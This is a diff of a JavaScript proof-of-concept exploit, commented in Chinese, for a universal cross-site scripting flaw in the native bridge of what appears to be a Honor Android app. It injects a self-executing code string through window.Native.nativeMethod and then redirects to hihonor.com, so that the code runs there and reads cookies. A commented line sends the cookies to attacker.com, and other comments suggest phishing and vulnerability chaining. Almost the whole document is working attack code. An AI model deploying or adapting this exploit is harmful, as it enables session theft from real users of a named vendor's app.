@@ -1,25 +1,40 @@
-<script>
-  window.uxssTriggered = false; // 标志位，确保漏洞只触发一次
+// 这个标志位用于防止在恶意页面上重复触发初始的异步调用，
+// 但更重要的是，它帮助我们模拟原始漏洞中 `window.noJump` 的作用，
+// 确保恶意代码只在目标域执行其核心功能。
+window.uxssExploitInitiated = false;
 
-function exploitNativeMethodUXSS() {
-    if (!window.uxssTriggered) {
-        window.uxssTriggered = true; // 标记为已触发
+// 定义一个包含UXSS核心逻辑的函数。
+// 这个函数本身不会被直接调用，而是它的源代码会被封装并传递。
+function performUXSSAction() {
+    // 这段代码将在目标域名（例如 hihonor.com）的上下文中执行
+    alert('UXSS 成功！当前域名: ' + document.domain);
+    alert('当前页面的 Cookie: ' + document.cookie);
+    // 这里可以添加更多恶意操作，例如：
+    // - 发送用户的敏感信息（如cookie、localStorage）到攻击者的服务器
+    // - 修改页面内容，进行钓鱼攻击
+    // - 利用其他漏洞链
+    // new Image().src = "http://attacker.com/steal_data?domain=" + encodeURIComponent(document.domain) + "&cookie=" + encodeURIComponent(document.cookie);
+}
 
-        // 1. 定义一个全局的恶意回调函数
-        // 这个函数将在重定向后的目标域（例如 hihonor.com）的上下文中执行
-        window.maliciousCallback = function(callbackId, eventType, data, d, e) {
-            // 在目标域上执行恶意代码
-            alert('UXSS 成功！当前域名: ' + document.domain);
-            alert('当前页面的 Cookie: ' + document.cookie);
-            // 这里可以添加更多恶意操作，例如：
-            // - 发送用户的敏感信息（如cookie、localStorage）到攻击者的服务器
-            // - 修改页面内容，进行钓鱼攻击
-            // - 利用其他漏洞链
-            // new Image().src = "http://attacker.com/steal_data?domain=" + encodeURIComponent(document.domain) + "&cookie=" + encodeURIComponent(document.cookie);
-        };
+function triggerNativeMethodUXSS() {
+    if (!window.uxssExploitInitiated) {
+        window.uxssExploitInitiated = true; // 标记为已启动
 
-        // 2. 构造调用 nativeMethod 的参数
-        let payloadJson = JSON.stringify({
+        // 1. 构造一个包含恶意JavaScript代码的字符串。
+        // 类似于原始漏洞中的 realFunc，它是一个自执行的匿名函数，
+        // 内部调用了我们定义的 performUXSSAction 函数。
+        // 关键是，这个字符串会在目标域被 evaluateJavascript 执行。
+        var uxssCallbackCodeString = `
+            (function() {
+                // 重新定义 performUXSSAction 在当前（目标）域的上下文中
+                // 确保即使原始页面被销毁，这段逻辑也能在新页面执行
+                var tempPerformUXSSAction = ${performUXSSAction.toString()};
+                tempPerformUXSSAction(); // 调用它
+            })();
+        `;
+
+        // 2. 准备 JSON payload
+        let test_Json = JSON.stringify({
             "packageName": "com.hihonor.app",
             "trackingParameter": "uxss_exploit",
             "externalJson": "malicious_data",
@@ -27,23 +42,23 @@ function exploitNativeMethodUXSS() {
             "isRefresh": true
         });
 
-        // 3. 调用 window.Native.nativeMethod，指定我们定义的恶意回调函数名
-        // 这里的 "maliciousCallback" 是一个字符串，指向上面定义的全局函数
+        // 3. 调用 window.Native.nativeMethod，将包含恶意代码的字符串作为回调参数。
+        // 这里假设 `nativeMethod` 的最后一个参数，尽管名为“回调函数名称”，
+        // 但实际上如果传入的是一个JS代码字符串，它会将其传递给 `evaluateJS` 执行。
+        // 这一点与原始漏洞中 `getDownloadUrl` 处理 `realFunc` 的方式是相似的。
         window.Native.nativeMethod(
             "com.hihonor.hm.h5.container.js.method.DeviceMethods",
             "getAppDeviceInfo",
-            payloadJson,
+            test_Json,
             "1",
-            "maliciousCallback" // 传递恶意回调函数的名称
+            uxssCallbackCodeString // 传递包含完整恶意逻辑的JS代码字符串
         );
 
-        // 4. 立即重定向到目标域
-        // 由于 nativeMethod 的回调是异步的，这个重定向会先于回调执行
+        // 4. 立即重定向到目标域。
+        // 这个操作是同步的，会在异步回调（uxssCallbackCodeString 的执行）之前完成。
         location.href = "https://www.hihonor.com/"; // 假设这是我们想要攻击的目标域
     }
 }
 
 // 页面加载时执行漏洞利用函数
-exploitNativeMethodUXSS();
-
-</script>
+triggerNativeMethodUXSS();
